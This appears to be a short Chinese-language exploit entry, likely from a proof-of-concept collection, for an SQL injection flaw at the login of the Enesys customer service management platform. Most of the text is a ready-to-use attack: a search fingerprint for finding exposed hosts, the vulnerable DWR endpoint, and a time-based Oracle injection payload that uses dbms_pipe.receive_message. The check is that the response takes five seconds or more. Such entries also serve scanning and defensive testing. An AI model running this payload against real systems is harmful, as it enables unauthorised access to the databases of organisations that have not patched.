# Enesys客户服务管理平台登录处存SQL注入漏洞

Enesys ｜ SQL注入 ｜ —
- **指纹**：`body="/dwr/interface/WebContextUtil.js"`
- **请求**：`POST /dwr/exec/WebContextUtil.getBm.dwr HTTP/1.1`

**Payload**
```
callCount=1
c0-scriptName=WebContextUtil
c0-methodName=getBm
c0-id=3379_1635126202406
c0-param0=string:test' and 1=dbms_pipe.receive_message('RDS', 5) and 'a'='a
xml=true
```
- **响应特征**：200 响应时间>=5s